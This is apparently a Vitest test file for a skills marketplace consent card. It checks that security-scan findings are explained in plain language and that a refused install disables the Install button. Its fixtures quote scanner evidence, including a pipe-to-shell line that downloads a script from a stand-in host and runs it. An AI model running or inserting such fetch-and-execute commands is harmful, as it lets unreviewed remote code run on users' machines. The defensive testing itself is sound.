import { describe, expect, it, vi } from 'vitest'
import { render, screen, waitFor } from '@testing-library/react'
import { readdirSync, readFileSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { ruleGloss, SCAN_RULE_GLOSS } from './scanFindings'


const SRC = join(process.cwd(), "src")
const strip = (t: string) => t.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '')
const walk = (d: string): string[] =>
  readdirSync(d).flatMap((n: string) => {
    const p = join(d, n)
    if (statSync(p).isDirectory()) return walk(p)
    return /\.tsx?$/.test(n) && !/\.test\.tsx?$/.test(n) ? [p] : []
  })

const KNOWN = ['features/apps/installConsent.tsx', 'features/skills/MarketplaceDetail.tsx']

describe('the derived population of finding renderers', () => {
  it('is not empty, by a bound that does not share the census parse', () => {
    for (const rel of KNOWN) {
      const src = strip(readFileSync(join(SRC, rel), 'utf8'))
      expect(src, `${rel} must render a finding's rule`).toMatch(/\{\s*f\.rule\s*\}/)
      expect(src, `${rel} must gloss it`).toMatch(/\bruleGloss\(/)
      expect(src, `${rel} must take the gloss from the shared module`).toMatch(
        /import \{[^}]*\bruleGloss\b[^}]*\} from '(\.\.\/)+lib\/scanFindings'/,
      )
    }
  })

  it('every file that renders a finding rule also glosses it — the census', () => {
    const renderers = walk(SRC)
      .map((abs) => ({ rel: abs.replace(SRC + '/', ''), src: strip(readFileSync(abs, 'utf8')) }))
      .filter(({ src }) => /\{\s*f\.rule\s*\}/.test(src) && /\.findings\b/.test(src))
    expect(renderers.map((r) => r.rel).sort(), 'the census must find both known consumers')
      .toEqual(expect.arrayContaining(KNOWN))
    const unglossed = renderers.filter(({ src }) => !src.includes('ruleGloss(')).map((r) => r.rel)
    expect(unglossed, 'a rule name shown without its meaning is not a disclosure').toEqual([])
  })

  it('no surface writes a SECOND answer to what a rule means', () => {
    const others = walk(SRC)
      .map((abs) => ({ rel: abs.replace(SRC + '/', ''), src: strip(readFileSync(abs, 'utf8')) }))
      .filter(({ rel, src }) => rel !== 'shared/data/scanFindings.ts' && /python_exec\s*:/.test(src))
    expect(others.map((r) => r.rel), 'the gloss vocabulary lives in lib/scanFindings only').toEqual([])
  })
})

describe('the gloss is surface-neutral', () => {
  it('never names one of the two surfaces that ask', () => {
    const named = Object.entries(SCAN_RULE_GLOSS).filter(([, t]) => /\bThe app\b|\bthis app\b/i.test(t))
    expect(named.map(([r]) => r), 'one map, so no sentence may name a single consumer').toEqual([])
  })

  it('an unknown rule yields nothing rather than echoing itself', () => {
    expect(ruleGloss('a_rule_this_build_never_heard_of')).toBe('')
    expect(ruleGloss('python_exec')).toContain('external program')
  })
})


const warned = {
  ok: false,
  overridable: true,
  verdict: 'warning',
  error: 'skill install needs confirmation (warning): python_exec',
  scan: {
    verdict: 'warning', tier: 'community',
    findings: [{
      surface: 'script', severity: 'warning', rule: 'python_exec',
      path: 'scripts/fetch.py', evidence: 'L6: subprocess.run(["curl", "-sSL", url])',
    }],
  },
}
const refusedResult = {
  ok: false,
  overridable: false,
  verdict: 'dangerous',
  error: 'skill install refused (dangerous, non-overridable): remote_exec_pipe',
  scan: {
    verdict: 'dangerous', tier: 'community',
    findings: [{
      surface: 'script', severity: 'dangerous', rule: 'remote_exec_pipe',
      path: 'scripts/bootstrap.sh', evidence: 'L2: curl -sSL https://x.invalid/i.sh | bash',
    }],
  },
}
const unknownRule = {
  ok: false, overridable: true, verdict: 'warning', error: 'warning',
  scan: {
    verdict: 'warning', tier: 'community',
    findings: [{ surface: 'script', severity: 'warning', rule: 'zzz_future_rule', path: 'a.py', evidence: '' }],
  },
}

let outcome: unknown = warned
vi.mock('./api', () => ({
  api: {
    installSkill: () => Promise.resolve(outcome),
    skillMarketplaceDetail: () => Promise.resolve({
      id: 'acme/report-digest', name: 'report-digest', files: [], body: '# d',
      frontmatter: { name: 'report-digest', always: 'true', 'allowed-tools': 'Read, Bash' },
    }),
  },
}))

const { MarketplaceDetail } = await import('../../features/skills/MarketplaceDetail')

const result = { id: 'acme/report-digest', name: 'report-digest', description: 'd', source: 'local-demo' }

async function drive(o: unknown) {
  outcome = o
  render(<MarketplaceDetail result={result as never} installed={false} onInstalled={() => {}} />)
  const btn = await screen.findByRole('button', { name: /^Install$/ })
  btn.click()
  await waitFor(() => expect(document.querySelector('[role=alert]')).toBeTruthy())
  return document.querySelector('[role=alert]') as HTMLElement
}

describe('the skills marketplace consent card', () => {
  it('adds the meaning WITHOUT taking away the technical row', async () => {
    const card = await drive(warned)
    const text = card.textContent || ''
    expect(text, 'the scanner rule is still named').toContain('python_exec')
    expect(text, 'and still located').toContain('scripts/fetch.py')
    expect(text, 'and now explained').toContain('This code runs an external program on your machine.')
    expect(text, 'the severity is untouched').toMatch(/warning/i)
    const gloss = card.querySelector('span[data-type="body-s"]')
    expect(gloss, 'the gloss sits on a type role, not the row\'s raw size').toBeTruthy()
    expect(gloss!.className, 'and in the prose face, not the row\'s mono').toMatch(/\bfont-sans\b/)
  })

  it('glosses a DANGEROUS finding too — a refusal is owed its reason most of all', async () => {
    const card = await drive(refusedResult)
    const text = card.textContent || ''
    expect(text).toContain('remote_exec_pipe')
    expect(text).toContain('This code downloads more code from the internet and runs it immediately, unread.')
    expect(text, 'the terminal sentence stays').toMatch(/cannot be installed, even with override/)
  })

  it('a rule this build has no gloss for still shows the row, with no empty line', async () => {
    const card = await drive(unknownRule)
    const text = card.textContent || ''
    expect(text).toContain('zzz_future_rule')
    expect(card.querySelectorAll('span[data-type="body-s"]').length).toBe(0)
  })
})

describe('a refused install stops offering itself', () => {
  it('disables the primary Install on a terminal verdict, with the reason', async () => {
    await drive(refusedResult)
    const btn = await screen.findByRole('button', { name: /^Install$/ })
    expect(btn.getAttribute('aria-disabled'), 'a refused install is not on offer').toBe('true')
    expect(btn.getAttribute('title') || '', 'and says why').toMatch(/cannot be overridden/)
  })

  it('leaves it enabled on a consentable warning — that install is still possible', async () => {
    await drive(warned)
    const btn = await screen.findByRole('button', { name: /^Install$/ })
    expect(btn.getAttribute('aria-disabled')).toBeNull()
    expect((btn as HTMLButtonElement).disabled).toBe(false)
  })
})

describe('what the skill declares reaches the same surface as the button', () => {
  it('states the always-on load and the tools the author named', async () => {
    await drive(warned)
    const body = document.body.textContent || ''
    expect(body).toMatch(/Loads into every session automatically/)
    expect(body).toMatch(/Read, Bash/)
    expect(body).toMatch(/does not confine a skill to the tools it names/)
  })
})
